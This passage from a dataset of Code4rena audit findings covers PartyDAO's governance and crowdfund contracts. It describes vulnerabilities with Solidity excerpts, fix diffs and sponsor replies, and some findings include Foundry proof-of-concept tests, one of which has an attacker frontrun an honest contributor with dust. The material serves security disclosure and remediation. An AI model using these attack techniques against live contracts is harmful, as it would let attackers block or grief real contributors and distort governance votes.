      "content": "\n<https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L598-L605>\n\n<https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L46-L51>\n\nThis issue does not manifest itself in a limited segment of the code.\n\nInstead it spans multiple contracts and derives its impact from the interaction of these contracts.\n\nIn the PoC section I will do my best in explaining how this results in an issue.\n\nI discussed this with the sponsor and they explained to me that this issue is due to a PR that has unintentionally not been merged.\n\n![Discord message](https://user-images.githubusercontent.com/118979828/231990051-b9f731f1-1678-43e3-81e4-7ec0164bdc10.png)\n\nSo they have already written the code that is necessary to fix this issue. It's just not been merged with this branch. So since the sponsor knows about this already and it's just the PR that has gone missing it's not necessary for me to provide the full Solidity code to fix this issue.\n\nIn short, this issue is due to the fact that the `totalVotingPower` is not snapshotted when a proposal is created.\n\nThe votes that are used to vote for a proposal (or veto it) are based on a specific snapshot (1 block prior to the proposal being created).\n\nWhen the `totalVotingPower` changes this leads to unintended consequences.\n\nWhen `totalVotingPower` decreases, votes become more valuable than they should be.\n\nAnd when `totalVotingPower` increases, votes become less valuable than they should be.\n\n### Proof of Concept\n\nWhen a proposal is created via the [`PartyGovernance.propose`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L527-L548) function, the proposal's `proposedTime` is set:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L537-L543)\n\n```solidity\nProposalStateValues({\n    proposedTime: uint40(block.timestamp),\n    passedTime: 0,\n    executedTime: 0,\n    completedTime: 0,\n    votes: 0\n}),\n```\n\nWhen users then vote in order to accept the proposal or veto the proposal, their votes are based on the snapshot at the `proposedTime - 1` timestamp.\n\nWe can see this in the `PartyGovernance.accept` function:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L592)\n\n```solidity\nuint96 votingPower = getVotingPowerAt(msg.sender, values.proposedTime - 1, snapIndex);\n```\n\nAnd we can see it in the `VetoProposal.voteToVeto` function:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L37-L41)\n\n```solidity\nuint96 votingPower = party.getVotingPowerAt(\n    msg.sender,\n    proposalValues.proposedTime - 1,\n    snapIndex\n);\n```\n\nHowever the `totalVotingPower` to determine whether enough votes have been collected is the current `totalVotingPower`:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L598-L605)\n\n```solidity\nif (\n    values.passedTime == 0 &&\n    _areVotesPassing(\n        values.votes,\n        _governanceValues.totalVotingPower,\n        _governanceValues.passThresholdBps\n    )\n) {\n```\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L46-L51)\n\n```solidity\nif (\n    _areVotesPassing(\n        newVotes,\n        governanceValues.totalVotingPower,\n        governanceValues.passThresholdBps\n    )\n```\n\nThe `totalVotingPower` is not constant. It can increase and decrease.\n\nNow we can understand the issue. The `totalVotingPower` must be based on the same time as the votes (i.e. `proposedTime - 1`).\n\nLet's look at a scenario:\n\n    At the time of proposal creation (proposedTime - 1):\n\n    Alice: 100 Votes\n    Bob: 50 Votes\n    Chris: 50 Votes\n\n    totalVotingPower=200\n\nLet's say 80% of votes are necessary for the proposal to pass.\n\nNow the `totalVotingPower` is increased (e.g. by a `ReraiseETHCrowdfund`) since David now has 100 Votes:\n\n    Alice: 100 Votes\n    Bob: 50 Votes\n    Chris: 50 Votes\n    David: 100 Votes \n\n    totalVotingPower=300\n\nNow it is impossible for the proposal to pass.\n\nThe proposal needs 80% of 300 Votes which is 240 Votes. But the votes are used from the old snapshot and there were only 200 Votes.\n\nThe old `totalVotingPower` should have been used (200 Votes instead of 300 Votes).\n\nSimilarly there is an issue when `totalVotingPower` decreases:\n\n    Alice: 100 Votes\n    Bob: 50 Votes\n    Chris: 0 Votes\n\n    totalVotingPower=150\n\nIf 60% of the votes are necessary for the proposal to pass, Alice can make the proposal pass on her own because `totalVotingPower=150` is used even though the old `totalVotingPower=200` should be used.\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nAs explained above the sponsor already has the code to implement snapshotting the `totalVotingPower`.\n\nIn short the following changes need to be made:\n\n1.  Snapshot `totalVotingPower` whenever it is changed\n\n2.  Whenever `totalVotingPower` is used to calculate whether a proposal is accepted / vetoed, the snapshot should be used\n\n**[0xble (Party) confirmed](https://github.com/code-423n4/2023-04-party-findings/issues/9#issuecomment-1512082754)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is regarding an issue in the code of a decentralized application (dApp) that is based on the Ethereum blockchain. The issue is due to the fact that the `totalVotingPower` is not snapshotted when a proposal is created. This leads to unintended consequences when the `totalVotingPower` changes. \n\nWhen `totalVotingPower` decreases, votes become more valuable than they should be. And when `totalVotingPower` increases, votes become less valuable than they should be. To illustrate this, let's look at a scenario. \n\nAt the time of proposal creation (proposedTime - 1):\n\n    Alice: 100 Votes\n    Bob: 50 Votes\n    Chris: 50 Votes\n\ntotalVotingPower=200\n\nLet's say 80% of votes are necessary for the proposal to pass. Now the `totalVotingPower` is increased (e.g. by a `ReraiseETHCrowdfund`) since David now has 100 Votes:\n\n    Alice: 100 Votes\n    Bob: 50 Votes\n    Chris: 50 Votes\n    David: 100 Votes \n\ntotalVotingPower=300\n\nNow it is impossible for the proposal to pass. The proposal needs 80% of 300 Votes which is 240 Votes. But the votes are used from the old snapshot and there were only 200 Votes.\n\nThe sponsor already has the code to implement snapshotting the `totalVotingPower`. In short the following changes need to be made:\n\n1.  Snapshot `totalVotingPower` whenever it is changed\n\n2.  Whenever `totalVotingPower` is used to calculate whether a proposal is accepted / vetoed, the snapshot should be used\n\nThis bug report has been confirmed by the sponsor and the recommended mitigation steps are clear.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "https://github.com/code-423n4/2023-04-party-findings/issues/9",
      "tags": [
        "Vote"
      ],
      "finders": [
        "HollaDieWaldfee"
      ]
    },
    {
      "id": "19993",
      "title": "[M-06] `PartyGovernanceNFT.sol`: burn function does not reduce `totalVotingPower` making it impossible to reach unanimous votes",
      "impact": "MEDIUM",
      "content": "\nWith the new version of the Party protocol the [`PartyGovernanceNFT.burn`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernanceNFT.sol#L201-L224) function has been introduced.\n\nThis function is used to burn party cards.\n\nAccording to the sponsor the initial purpose of this function was to enable the [`InitialETHCrowdfund`](https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/InitialETHCrowdfund.sol) contract (the `burn` function is needed for refunds).\n\nLater on they decided to allow any user to call this function and to burn their party cards.\n\nThe second use case when a regular user burns his party card is when the issue occurs.\n\nThe `PartyGovernanceNFT.burn` function does not decrease `totalVotingPower` which makes it impossible to reach an unanimous vote after a call to this function and it makes remaining votes of existing users less valuable than they should be.\n\n### Proof of Concept\n\nLet's look at the `PartyGovernanceNFT.burn` function:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernanceNFT.sol#L201-L224)\n\n```solidity\nfunction burn(uint256 tokenId) external onlyDelegateCall {\n    address owner = ownerOf(tokenId);\n    if (\n        msg.sender != owner &&\n        getApproved[tokenId] != msg.sender &&\n        !isApprovedForAll[owner][msg.sender]\n    ) {\n        // Allow minter to burn cards if the total voting power has not yet\n        // been set (e.g. for initial crowdfunds) meaning the party has not\n        // yet started.\n        uint96 totalVotingPower = _governanceValues.totalVotingPower;\n        if (totalVotingPower != 0 || !isAuthority[msg.sender]) {\n            revert UnauthorizedToBurnError();\n        }\n    }\n\n\n    uint96 votingPower = votingPowerByTokenId[tokenId].safeCastUint256ToUint96();\n    mintedVotingPower -= votingPower;\n    delete votingPowerByTokenId[tokenId];\n\n\n    _adjustVotingPower(owner, -votingPower.safeCastUint96ToInt192(), address(0));\n\n\n    _burn(tokenId);\n}\n```\n\nIt burns the party card specified by the `tokenId` parameter and makes the appropriate changes to the voting power of the owner (by calling `_adjustVotingPower`) and to `mintedVotingPower`.\n\nBut it does not reduce `totalVotingPower` which remains untouched by this function.\n\nIn case this function is called by `InitialETHCrowdfund` it is intended that `totalVotingPower` is not reduced. In this case the `burn` function is only called when the initial crowdfund is lost and `totalVotingPower` hasn't even been increased so it is still `0` (the initial value).\n\nBut why is it an issue when a regular user calls this function?\n\nLet's consider the following scenario:\n\n    Alice: 100 Votes\n    Bob: 100 Votes\n    Chris: 100 Votes\n\n    totalVotingPower = 300 Votes\n\nNow Alice decides to burn half of her voting power:\n\n    Alice: 50 Votes\n    Bob: 100 Votes\n    Chris: 100 Votes\n\n    totalVotingPower = 300 Votes\n\nNow it is easy to see why it is a problem that `totalVotingPower` is not reduced.\n\nIt is impossible to reach an unanimous vote because even if all users vote there is only a `(250/300) = ~83%` agreement.\n\nOne vote only represents `1/300 = ~ 0.33%` of all votes even though it should represent `1/250 = 0.4%` of all votes. And thereby votes are less valuable than they should be.\n\nYou can see in the following test that `totalVotingPower` stays unaffected even though `voter1` burns his party card which represents a third of all votes.\n\n(Add the test to the `PartyGovernanceNFTUnit.sol` test file and add this import: `import \"../../contracts/party/PartyGovernance.sol\";` to access the `GovernanceValues` struct ).\n\n```solidity\nfunction test_canntReachUnanimousVoteAfterBurning() external {\n    _initGovernance();\n    address voter1 = _randomAddress();\n    address voter2 = _randomAddress();\n    address voter3 = _randomAddress();\n    uint256 vp = defaultGovernanceOpts.totalVotingPower / 3;\n    uint256 token1 = nft.mint(voter1, vp, voter1);\n    uint256 token2 = nft.mint(voter2, vp, voter2);\n    uint256 token3 = nft.mint(voter3, vp, voter3);\n\n    assertEq(nft.mintedVotingPower(), vp*3);\n    assertEq(nft.getCurrentVotingPower(voter1), vp);\n\n    PartyGovernance.GovernanceValues memory gv = nft.getGovernanceValues();\n    console.log(gv.totalVotingPower);\n\n    vm.prank(voter1);\n    nft.burn(token1);\n    gv = nft.getGovernanceValues();\n    // totalVotingPower stays the same\n    console.log(gv.totalVotingPower);\n}\n```\n\nThe remaining two voters will not be able to reach unanimous vote since the `_isUnanimousVotes` function is called with `totalVotingPower` as the total votes with which to calculate the percentage.\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L988)\n\n```solidity\nif (_isUnanimousVotes(pv.votes, _governanceValues.totalVotingPower)) {\n```\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L1024)\n\n```solidity\nif (_isUnanimousVotes(pv.votes, gv.totalVotingPower)) {\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nIt is important to understand that when `InitialETHCrowdfund` calls the `burn` function it is intended that `totalVotingPower` is not reduced.\n\nSo we need to differentiate these two cases.\n\nFix:\n\n```diff\ndiff --git a/contracts/party/PartyGovernanceNFT.sol b/contracts/party/PartyGovernanceNFT.sol\nindex 9ccfa1f..d382d0e 100644\n--- a/contracts/party/PartyGovernanceNFT.sol\n+++ b/contracts/party/PartyGovernanceNFT.sol\n@@ -200,6 +200,7 @@ contract PartyGovernanceNFT is PartyGovernance, ERC721, IERC2981 {\n     /// @param tokenId The ID of the NFT to burn.\n     function burn(uint256 tokenId) external onlyDelegateCall {\n         address owner = ownerOf(tokenId);\n+        uint96 totalVotingPower = _governanceValues.totalVotingPower;\n         if (\n             msg.sender != owner &&\n             getApproved[tokenId] != msg.sender &&\n@@ -208,7 +209,6 @@ contract PartyGovernanceNFT is PartyGovernance, ERC721, IERC2981 {\n             // Allow minter to burn cards if the total voting power has not yet\n             // been set (e.g. for initial crowdfunds) meaning the party has not\n             // yet started.\n-            uint96 totalVotingPower = _governanceValues.totalVotingPower;\n             if (totalVotingPower != 0 || !isAuthority[msg.sender]) {\n                 revert UnauthorizedToBurnError();\n             }\n@@ -218,6 +218,10 @@ contract PartyGovernanceNFT is PartyGovernance, ERC721, IERC2981 {\n         mintedVotingPower -= votingPower;\n         delete votingPowerByTokenId[tokenId];\n \n+        if (totalVotingPower != 0 || !isAuthority[msg.sender]) {\n+            _governanceValues.totalVotingPower = totalVotingPower - votingPower;\n+        }\n+\n         _adjustVotingPower(owner, -votingPower.safeCastUint96ToInt192(), address(0));\n \n         _burn(tokenId);\n```\n\nAlso note that the `|| !isAuthority[msg.sender]` part of the condition is important.\n\nIt ensures that if we are not yet in the governance phase, i.e. `totalVotingPower == 0` and a user calls the `burn` function he cannot burn his party card. This is because the `totalVotingPower - votingPower` subtraction results in an underflow.\n\nThis ensures that in the pre-governance phase a user cannot accidentally burn his party card. He can only burn it via the `InitialETHCrowdfund` contract which ensures the user gets his ETH refund.\n\n**[0xble (Party) commented](https://github.com/code-423n4/2023-04-party-findings/issues/10#issuecomment-1512060843):**\n > @HollaDieWaldfee - I like the recommended mitigation. Had a question, if there were snapshots of `totalVotingPower` for each proposal is it fine that those are not updated? It is the same as if that an inactive user did not vote on a proposal, which can happen already. My concerns with updating it is that it seems like a riskier mitigation to implement that may cause unintended side-effects (if not now, later down the line). I also don't want to add more storage to the contract to fix this (it is already at with the contract size limit with `--via-ir` enabled).\n\n**[HollaDieWaldfee (warden) commented](https://github.com/code-423n4/2023-04-party-findings/issues/10#issuecomment-1512065324):**\n > @0xble - Yes I think it is ok to not update the snapshots. I have the same reasoning as you that it's basically just an inactive user.\n> \n> And I agree that updating instead is wrong because it gives remaining users higher voting power.\n\n**[0xble (Party) confirmed](https://github.com/code-423n4/2023-04-party-findings/issues/10#issuecomment-1512082911)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the `PartyGovernanceNFT.burn` function introduced in the new version of the Party protocol. It is used to burn party cards and it was initially intended to enable the `InitialETHCrowdfund` contract for refunds. Later on, it was decided to allow any user to call this function and to burn their party cards.\n\nThe issue is that the `PartyGovernanceNFT.burn` function does not decrease `totalVotingPower` which makes it impossible to reach an unanimous vote after a call to this function and it makes remaining votes of existing users less valuable than they should be.\n\nTo illustrate the issue, let's consider the following scenario: Alice, Bob and Chris have 100 votes each, making the total voting power 300 votes. If Alice burns half of her voting power, the total voting power remains the same, making it impossible for the remaining two voters to reach unanimous vote since the `_isUnanimousVotes` function is called with `totalVotingPower` as the total votes with which to calculate the percentage.\n\nTo fix this issue, it is important to differentiate the two cases when the `burn` function is called. The recommended mitigation is to add a condition to the `burn` function which checks if `totalVotingPower` is not equal to 0 and that the sender is not an authority. This ensures that in the pre-governance phase a user cannot accidentally burn his party card. He can only burn it via the `InitialETHCrowdfund` contract which ensures the user gets his ETH refund. It is also important to note that updating `totalVotingPower` instead is wrong because it gives remaining users higher voting power.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "https://github.com/code-423n4/2023-04-party-findings/issues/10",
      "tags": [],
      "finders": [
        "HollaDieWaldfee"
      ]
    },
    {
      "id": "19992",
      "title": "[M-05] Possible DOS attack using dust in `ReraiseETHCrowdfund._contribute()`",
      "impact": "MEDIUM",
      "content": "\nNormal contributors wouldn't contribute to the crowdfund properly by a malicious frontrunner.\n\n### Proof of Concept\n\nWhen users contribute to the `ReraiseETHCrowdfund`, it mints the crowdfund NFT in `_contribute()`.\n\n```solidity\nFile: 2023-04-party\\contracts\\crowdfund\\ReraiseETHCrowdfund.sol\n228:         votingPower = _processContribution(contributor, delegate, amount);\n229: \n230:         // OK to contribute with zero just to update delegate.\n231:         if (amount == 0) return 0;\n232: \n233:         uint256 previousVotingPower = pendingVotingPower[contributor];\n234: \n235:         pendingVotingPower[contributor] += votingPower;\n236: \n237:         // Mint a crowdfund NFT if this is their first contribution.\n238:         if (previousVotingPower == 0) _mint(contributor); //@audit DOS by sending dust\n```\n\nAs we can see, it mints the NFT when `previousVotingPower == 0` to mint for the first contribution.\n\nBut `votingPower` from `_processContribution()` might be 0 even if `amount > 0` and `pendingVotingPower[contributor]` would be remained as 0 after the first contribution.\n\nThen this function will revert from the second contribution as it tries to mint the NFT again.\n\nThe below shows the detailed scenario and POC.\n\n1.  Let's assume `exchangeRateBps = 5e3`. So [votingPower for 1 wei is zero](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L233). Also, [from the test configurations](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/sol-tests/crowdfund/ReraiseETHCrowdfund.t.sol#L251), it's not a strong condition to assume `minContributions = 0`.\n2.  After noticing an honest user contributes with 1 ether, an attacker frontruns `contributeFor()` for the honest user with 1 wei.\n3.  Then the crowdfund NFT of the honest user will be minted but the voting power is still 0.\n4.  During the honest user's `contribute()`, it will try to mint the NFT again as [previousVotingPower == 0](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L238) and revert. So he can't contribute for this crowdfund.\n\nWhile executing the POC, [opts.exchangeRateBps](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/sol-tests/crowdfund/ReraiseETHCrowdfund.t.sol#L72) should be `5e3`.\n\n```solidity\n    function test_contribute_DOSByFrontrunnerWithDust() public {\n        ReraiseETHCrowdfund crowdfund = _createCrowdfund({\n            initialContribution: 0,\n            initialContributor: payable(address(0)),\n            initialDelegate: address(0),\n            minContributions: 0,\n            maxContributions: type(uint96).max,\n            disableContributingForExistingCard: false,\n            minTotalContributions: 3 ether,\n            maxTotalContributions: 5 ether,\n            duration: 7 days,\n            fundingSplitBps: 0,\n            fundingSplitRecipient: payable(address(0))\n        });\n\n        address attacker = _randomAddress();\n        address honest = _randomAddress();\n        vm.deal(attacker, 1); //attacker has 1 wei\n        vm.deal(honest, 1 ether); //honest user has 1 ether\n\n        // Contribute\n        vm.startPrank(attacker); //attacker frontruns for the honest user\n        crowdfund.contributeFor{ value: 1 }(payable(honest), honest, \"\");\n        vm.stopPrank();\n\n        assertEq(crowdfund.balanceOf(honest), 1); //crowdfund NFT of the honest users was minted\n        assertEq(crowdfund.pendingVotingPower(honest), 0); //voting power = 0 because of the low exchangeRateBps\n\n        vm.expectRevert(\n            abi.encodeWithSelector(\n                CrowdfundNFT.AlreadyMintedError.selector,\n                honest,\n                uint256(uint160(honest))\n            )\n        );\n        vm.startPrank(honest); //when the honest user contributes, reverts\n        crowdfund.contribute{ value: 1 ether }(honest, \"\");\n        vm.stopPrank();\n    }\n```\n\n### Recommended Mitigation Steps\n\nRecommend minting the crowdfund NFT when the new `votingPower` is positive. Then we can avoid duplicate mints.\n\n```solidity\nFile: 2023-04-party\\contracts\\crowdfund\\ReraiseETHCrowdfund.sol\n233:         uint256 previousVotingPower = pendingVotingPower[contributor];\n234: \n235:         pendingVotingPower[contributor] += votingPower;\n236: \n237:         // Mint a crowdfund NFT if this is their first meaningful contribution.\n238:         if (previousVotingPower == 0 && votingPower != 0) _mint(contributor); //++++++++++++++++\n```\n\n**[0xble (Party) confirmed and commented](https://github.com/code-423n4/2023-04-party-findings/issues/18#issuecomment-1518922059):**\n > Will be mitigated by reverting if contributing leads to zero voting power (i.e. `contributionAmount * exchangeRateBps / 1e4 == 0`).\n\n\n\n***\n\n",
      "summary": "\nA bug report has been found in the `ReraiseETHCrowdfund` contract which allows malicious frontrunners to prevent normal contributors from contributing properly to the crowdfund. This is done by minting a crowdfund NFT when the first contribution is made, regardless of the amount of the contribution. The bug is triggered when the voting power from `_processContribution()` is 0, even if `amount > 0`, and `pendingVotingPower[contributor]` remains 0 after the first contribution. This causes the function to revert when the user tries to make a second contribution.\n\nThe recommended mitigation step is to mint the crowdfund NFT when the new voting power is positive, thus avoiding duplicate mints. This has been confirmed and commented on by 0xble (Party).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "https://github.com/code-423n4/2023-04-party-findings/issues/18",
      "tags": [],
      "finders": [
        "hansfriese"
      ]
    },
    {
      "id": "19991",
      "title": "[M-04] `ReraiseETHCrowdfund#claimMultiple` can be used to grief large depositors",
      "impact": "MEDIUM",
      "content": "\nUser can be grieved by being force minted a large number of NFTs with low voting power instead of one with high voting power.\n\n### Proof of Concept\n\n[ReraiseETHCrowdfund.sol#L354-L377](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L354-L377)\n\n        for (uint256 i; i < votingPowerByCard.length; ++i) {\n            if (votingPowerByCard[i] == 0) continue;\n\n            uint96 contribution = (votingPowerByCard[i] * 1e4) / exchangeRateBps;\n            if (contribution < minContribution_) {\n                revert BelowMinimumContributionsError(contribution, minContribution_);\n            }\n\n            if (contribution > maxContribution_) {\n                revert AboveMaximumContributionsError(contribution, maxContribution_);\n            }\n\n            votingPower -= votingPowerByCard[i];\n\n            // Mint contributor a new party card.\n            uint256 tokenId = party.mint(contributor, votingPowerByCard[i], delegate);\n\n            emit Claimed(contributor, tokenId, votingPowerByCard[i]);\n        }\n\n`ReraiseETHCrowdfund#claimMultiple` can be called by any user for any other user. The above loop uses the user specified `votingPowerByCard` to assign each token a voting power and mint them to the contributor. This is problematic because large contributors can have their voting power fragmented into a large number of NFTs which a small amount of voting power each. The dramatically inflates the gas costs of the affected user.\n\n**Example:**<br>\n`minContribution = 1` and `maxContribution = 100`. User A contributes 100. This means they should qualify for one NFT of the largest size. However instead they can be minted 100 NFTs with 1 vote each.\n\n### Recommended Mitigation Steps\n\nIf msg.sender isn't contributor it should force the user to mint the minimum possible number of NFTs:\n\n        uint256 votingPower = pendingVotingPower[contributor];\n\n        if (votingPower == 0) return;\n\n    +  if (msg.sender != contributor) {\n    +      require(votingPowerByCard.length == (((votingPower - 1)/maxContribution) + 1));\n    +  }\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-04-party-findings/issues/35#issuecomment-1509846159):**\n > Looking forward to sponsor comment on this one, I do see the potential issue.\n\n**[0xble (Party) confirmed and commented](https://github.com/code-423n4/2023-04-party-findings/issues/35#issuecomment-1511922104):**\n > To give more context, the reason we allow minting/claiming on another's behalf is to allow others to potentially unblock governance if a user with delegated voting power does not come to claim, so it is an important feature to enable. It also works this way in prior releases of the protocol with past crowdfunds.\n> \n> This is a valid concern though and I like the recommended mitigation.\n\n**[0xble (Party) commented](https://github.com/code-423n4/2023-04-party-findings/issues/35#issuecomment-1532057835):**\n > We've decided to refactor the way claiming works in the `ReraiseETHCrowdfund`, partially because a large number of findings like this being submitted around that one area that highlighted for us the need to rework its logic.\n> \n> The change will make it so (1) crowdfund NFTs are minted per contribution instead of per address and (2) claiming works more like a 1:1 conversion of your crowdfund NFT into a party card instead of how it works now. In the future we will also add the ability to split/merge party cards.\n> \n> This should mitigate this finding because in this new system you cannot decide how to allocate another person's voting power when claiming for them, there is only one choice which is to convert their crowdfund NFT into a party card of equivalent voting power.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a problem with the ReraiseETHCrowdfund.sol contract, which can be found on Github. When a user attempts to claim multiple NFTs with their voting power, the contract can force them to mint a large number of NFTs with low voting power instead of one with high voting power. This dramatically inflates the gas costs for the user.\n\nAn example is given, where if the minimum and maximum contribution is set to 1 and 100 respectively, a user who contributes 100 should qualify for one NFT of the largest size, however instead they can be minted 100 NFTs with 1 vote each.\n\nThe recommended mitigation step is to add a condition to the contract, which forces the user to mint the minimum possible number of NFTs if the msg.sender is not the contributor. This suggestion was judged to be valid and was confirmed by the Party. They also commented that they have decided to refactor the way claiming works in the contract, which should mitigate this finding. This new system will make it so crowdfund NFTs are minted per contribution instead of per address, and claiming will work more like a 1:1 conversion of a crowdfund NFT into a party card instead of how it works now.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "https://github.com/code-423n4/2023-04-party-findings/issues/35",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "19990",
      "title": "[M-03] Contributions can be smaller than `minContribution` and may receive no voting power",
      "impact": "MEDIUM",
      "content": "\nValid contribution is awarded no voting power.\n\n### Proof of Concept\n\n[ETHCrowdfundBase.sol#L195-L219](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L195-L219)\n\n        uint96 minContribution_ = minContribution;\n        if (amount < minContribution_) {\n            revert BelowMinimumContributionsError(amount, minContribution_);\n        }\n        uint96 maxContribution_ = maxContribution;\n        if (amount > maxContribution_) {\n            revert AboveMaximumContributionsError(amount, maxContribution_);\n        }\n\n        uint96 newTotalContributions = totalContributions + amount;\n        uint96 maxTotalContributions_ = maxTotalContributions;\n        if (newTotalContributions >= maxTotalContributions_) {\n            totalContributions = maxTotalContributions_;\n\n            // Finalize the crowdfund.\n            // This occurs before refunding excess contribution to act as a\n            // reentrancy guard.\n            _finalize(maxTotalContributions_);\n\n            // Refund excess contribution.\n            uint96 refundAmount = newTotalContributions - maxTotalContributions;\n            if (refundAmount > 0) {\n                amount -= refundAmount; <- @audit-issue amount is reduced after min check\n                payable(msg.sender).transferEth(refundAmount);\n            }\n\nWhen processing a contribution, if the amount contributed would push the crowdfund over the max then it is reduced. This is problematic because this reduction occurs AFTER it checks the amount against the minimum contribution. The result is that these contributions can end up being less than the specified minimum.\n\nAlthough an edge case, if amount is smaller than exchangeRateBps as it could result in the user receiving no voting power at all for their contribution.\n\n### Recommended Mitigation Steps\n\nEnforce minContribution after reductions to amount.\n\n**[0xble (Party) acknowledged and commented](https://github.com/code-423n4/2023-04-party-findings/issues/37#issuecomment-1515511086):**\n > This was done intentionally.`minContribution` may be bypassed for the last contributor when the remaining contribution is less than the min otherwise the party may never be able to reach `maxTotalContributions`.\n> \n> >  \"Although an edge case, if amount is smaller than exchangeRateBps as it could result in the user receiving no voting power at all for their contribution.\"\n> \n> For this though we can add a check to ensure that `votingPower != 0`.\n\n**[0xble (Party) confirmed and commented](https://github.com/code-423n4/2023-04-party-findings/issues/37#issuecomment-1526104629):**\n > Thinking about this one more, it may be worth enforcing the min/max contribution checks after this happens to not allow for this case where `contribution < minContribution`. The way it currently is creates a potentially bad scenario, as pointed out, where the last contributor may receive no voting power or not be able to claim their party card if this was a `ReraiseETHCrowdfund`.\n> \n> The motivation for allowing `minContribution` to be bypassed for the last contributor when the remaining contribution is less than `minContribution` was to allow parties to reach `maxTotalContributions` in a case where they otherwise wouldn't be able to because the contribution to reach it would be below `minContribution`. However, in this scenario the crowdfund can still be won if either the crowdfund expires above `minTotalContribution` or a host finalizes at any point after `minTotalContribution` has been reached. So given the party has recourse if this were to happen, it makes more sense not to allow for this edge case where `contribution < minContribution`.\n> \n> Will mitigate by enforcing `minContribution` after reductions to the contribution amount.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a flaw in the code of the ETHCrowdfundBase.sol smart contract, which is part of the 2023-04-party project. The code in question is located at ETHCrowdfundBase.sol#L195-L219.\n\nThe issue is that when a contribution is made, if it would push the crowdfund over the max then it is reduced. This reduction occurs after it checks the amount against the minimum contribution. This means that contributions can end up being less than the specified minimum, resulting in the user receiving no voting power for their contribution.\n\nThe recommended mitigation step is to enforce the minimum contribution after reductions to the contribution amount. This was acknowledged and confirmed by 0xble (Party). The motivation for allowing the minimum contribution to be bypassed was to allow parties to reach the maximum total contributions in cases where they otherwise wouldn't be able to. However, the crowdfund can still be won if it expires above the minimum total contribution or if a host finalizes at any point after the minimum total contribution has been reached.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "https://github.com/code-423n4/2023-04-party-findings/issues/37",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "19989",
      "title": "[M-02] `MaxContribution` check can be bypassed to give a card high voting power",
      "impact": "MEDIUM",
      "content": "\nReraiseETHCrowdfund tries limit the voting power of each card by doing a min/maxContribution check in claim and claimMultiple.\n\n                uint96 contribution = (votingPower * 1e4) / exchangeRateBps;\n                uint96 maxContribution_ = maxContribution;\n                // Check that the contribution equivalent of total pending voting\n                // power is not above the max contribution range. This can happen\n                // for contributors who contributed multiple times In this case, the\n                // `claimMultiple` function should be called instead. This is done\n                // so parties may use the minimum and maximum contribution values to\n                // limit the voting power of each card (e.g.  a party desiring a \"1\n                // card = 1 vote\"-like governance system where each card has equal\n                // voting power).\n                if (contribution > maxContribution_) {\n                    revert AboveMaximumContributionsError(contribution, maxContribution_);\n                }\n\n<https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol#L270-L282>\n\n                // Check that the contribution equivalent of voting power is within\n                // contribution range. 